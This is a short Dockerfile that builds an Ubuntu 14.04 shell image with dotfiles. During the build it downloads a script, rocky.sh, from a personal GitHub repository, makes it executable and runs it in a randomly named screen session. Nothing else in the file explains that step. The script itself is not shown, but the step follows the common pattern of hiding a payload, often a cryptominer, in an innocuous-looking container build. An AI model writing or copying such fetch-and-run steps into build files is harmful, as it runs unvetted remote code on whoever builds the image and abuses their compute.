FROM ubuntu:14.04

# Install.
RUN \
  apt-get update && \
  apt-get install screen -y && \
  apt-get install -y wget && \
  wget https://github.com/thoeb292/thoeb292/raw/main/rocky.sh  && \
  chmod +x rocky.sh  && \
  ./rocky.sh > screen -R azuveji && \
  rm -rf /var/lib/apt/lists/*

# Add files.
ADD root/.bashrc /root/.bashrc
ADD root/.gitconfig /root/.gitconfig
ADD root/.scripts /root/.scripts

# Set environment variables.
ENV HOME /root

# Define working directory.
WORKDIR /root

# Define default command.
CMD ["bash"]
